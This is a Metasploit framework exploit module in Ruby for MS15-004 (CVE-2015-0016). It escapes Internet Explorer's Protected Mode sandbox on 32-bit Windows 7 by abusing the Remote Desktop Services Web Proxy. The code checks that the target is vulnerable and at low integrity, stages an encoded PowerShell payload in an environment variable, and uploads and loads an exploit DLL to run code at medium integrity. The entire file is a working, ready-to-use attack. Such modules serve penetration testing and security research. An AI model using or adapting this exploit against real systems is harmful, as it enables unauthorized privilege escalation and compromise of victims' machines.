##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'MS15-004 Microsoft Remote Desktop Services Web Proxy IE Sandbox Escape',
      'Description'    => %q{
        This module abuses a process creation policy in Internet Explorer's sandbox, specifically
        the Microsoft Remote Desktop Services Web Proxy IE one, which allows the attacker to escape
        the Protected Mode, and execute code with Medium Integrity. At the moment, this module only
        bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This module has been tested
        successfully on Windows 7 SP1 (32 bits) with IE 8 and IE 11.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # From Threat Intel of Symantec
          'Henry Li', # Public vulnerability analysis
          'juan vazquez' # Metasploit module
        ],
      'Platform'       => 'win',
      'SessionTypes'   => ['meterpreter'],
      'Arch'           => [ARCH_X86],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 30
        },
      'Targets'        =>
        [
          [ 'Protected Mode (Windows 7) / 32 bits',
            {
              'Arch' => ARCH_X86
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'     =>
        [
          ['CVE', '2015-0016'],
          ['MSB', 'MS15-004'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/']
        ],
      'DisclosureDate' => 'Jan 13 2015'
    }))
  end

  def check
    temp = get_env('WINDIR')
    dll_path = "#{temp}\\System32\\TSWbPrxy.exe"

    win_ver = sysinfo['OS']

    unless win_ver =~ /Windows Vista|Windows 2008|Windows 2012|Windows [78]/
      return Exploit::CheckCode::Safe
    end

    unless file_exist?(dll_path)
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Detected
  end

  def exploit
    print_status('Checking target...')
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, 'System not vulnerable')
    end

    if session.platform !~ /^x86\//
      fail_with(Failure::NotVulnerable, 'Sorry, this module currently only allows x86/win32 sessions at the moment')
    end

    win_ver = sysinfo['OS']
    if win_ver =~ /Windows 2012|Windows 8/
      fail_with(Failure::NotVulnerable, 'This module doesn\'t run on Windows 8/2012 at the moment')
    end

    print_status('Checking the Process Integrity Level...')

    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, 'Not running at Low Integrity')
    end

    cmd = cmd_psh_payload(
      payload.encoded,
      payload_instance.arch.first,
      { :remove_comspec => true }
    )

    print_status('Storing payload on environment variable...')
    cmd.gsub!('powershell.exe ','')
    session.railgun.kernel32.SetEnvironmentVariableA('PSHCMD', cmd)

    print_status('Exploiting...')
    temp = get_env('TEMP')
    # Using the old meterpreter loader, if it's loaded with
    # Reflective DLL Injection the exceptions in the sandbox
    # policy won't apply.
    session.core.load_library(
      'LibraryFilePath' => ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0016', 'cve-2015-0016.dll'),
      'TargetFilePath'  => temp +  '\\cve-2015-0016.dll',
      'UploadLibrary'   => true,
      'Extension'       => false,
      'SaveToDisk'      => false
    )
  end

  def cleanup
    session.railgun.kernel32.SetEnvironmentVariableA('PSHCMD', nil)
    super
  end

end